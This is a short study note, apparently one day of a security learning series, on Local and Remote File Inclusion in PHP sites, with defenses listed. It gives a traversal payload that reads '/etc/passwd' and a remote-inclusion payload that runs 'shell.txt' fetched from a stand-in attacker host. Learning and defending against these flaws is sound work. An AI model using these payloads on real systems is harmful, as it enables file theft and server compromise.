## 🗓️ Day 41/100 – File Inclusion (LFI/RFI)

**Focus:** Exploiting insecure file handling to read sensitive data or execute arbitrary code.

### 📂 What is File Inclusion?
Vulnerabilities occurring when an application builds a file path using user-supplied data without validation.

### ⚔️ Attack Vectors

**1. Local File Inclusion (LFI)**
*   **Scenario:** URL is `http://site.com/index.php?page=about.php`
*   **Payload:** `?page=../../../../etc/passwd`
*   **Impact:** Read sensitive local files (config files, source code, password hashes).
*   **Escalation:** **LFI to RCE** via Log Poisoning (injecting PHP into Apache logs and including the log file).

**2. Remote File Inclusion (RFI)**
*   **Requirement:** `allow_url_include = On` in php.ini
*   **Payload:** `?page=http://attacker-server.com/shell.txt`
*   **Impact:** The server fetches and executes the external script. Immediate full system compromise.

### 🛡️ Defense Mechanisms
*   **ID Mapping:** Use an ID system (e.g., `?page=1` maps to `home.php`) rather than filenames.
*   **Basename Validation:** Ensure the input contains only the filename, not the path (`/` or `\`).
*   **Configuration:** Set `allow_url_fopen` and `allow_url_include` to `Off`.

**Day 41 Takeaway:** File paths are dangerous inputs. If you control the path, you often control the server.
